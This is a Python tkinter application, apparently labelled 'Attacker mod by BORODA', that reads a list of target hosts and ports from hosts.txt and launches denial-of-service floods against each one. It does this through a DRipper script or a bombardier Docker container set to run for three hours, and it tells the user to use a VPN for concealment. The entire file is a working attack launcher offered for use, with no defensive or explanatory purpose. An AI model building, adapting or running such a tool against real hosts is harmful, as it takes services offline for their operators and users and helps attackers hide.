#!/usr/bin/python3
import os
import pathlib
import random
import subprocess
import tkinter as tk
import docker

import dns.resolver

os.environ["PYTHONUNBUFFERED"] = "1"


def is_ip4(s):
    pieces = s.split('.')
    if len(pieces) != 4: return False
    try:
        return all(0 <= int(p) < 256 for p in pieces)
    except ValueError:
        return False


def get_ip(host):
    if is_ip4(host):
        return host
    try:
        resolver = dns.resolver.Resolver()
        ips = list(resolver.resolve(host, 'A'))
        ip = random.choice(ips)
    except:
        ip = '255.255.255.255'
        return ip
    return ip.to_text()


processes = []
app = tk.Tk()
app.title("Attacker mod by BORODA")
app.geometry('300x300')

message = tk.StringVar(app)
label = tk.Label(app, textvariable=message)
label.pack()

message.set("Better use vpn before running this app")

hosts = open("hosts.txt", "r")
data = hosts.read()
hosts.close()

text = tk.Text(app, height=17, width=152)
text.insert(1.0, data)

proc = None


def start():
    options_text = text.get(1.0, "end-1c")
    mode = radioSelector.get()
    for hostText in options_text.splitlines():
        if not hostText:
            continue
        host = hostText.split(":")
        ip = get_ip(host[0])
        port = "443"
        if len(host) > 1:
            port = host[1]
        if ip != '255.255.255.255':
            current = pathlib.Path(__file__).parent.resolve()
            os.chdir(current)
            if mode == 0:
                run_ripper(ip, port)
            elif mode == 1:
                run_docker(ip, port)


def stop():
    if radioSelector.get() == 0:
        for sub in processes:
            sub.kill()
    elif radioSelector.get() == 1:
        for sub in processes:
            sub.stop()
            sub.remove()
    exit(0)


def run_ripper(ip, port):
    cmd = f'python3 DRipper.py --quiet -s {ip} -t 135 -p {port}'
    sub = subprocess.Popen(cmd, shell=True)
    processes.append(sub)


def run_docker(ip, port):
    prefix = "https://"
    if port != "443":
        prefix = "http://"
    print(f"Starting bombardier to: {prefix}{ip}:{port}")
    client = docker.from_env()
    container = client.containers.create("alpine/bombardier", f"-c 135 -d 10800s -l {prefix}{ip}:{port}")
    container.start()
    processes.append(container)

radioSelector = tk.IntVar()
radio1 = tk.Radiobutton(app, text="DRipper", variable=radioSelector, value=0)
radio1.pack(side=tk.TOP)
radio1.select()
radio2 = tk.Radiobutton(app, text="Bombardier (Docker)", variable=radioSelector, value=1)
radio2.pack(side=tk.TOP)


btn = tk.Button(app, text='Start', bd='5', command=start)
btn.pack(side='top')

btn = tk.Button(app, text='Stop', bd='5', command=stop)
btn.pack(side='top')

text.pack()

app.mainloop()
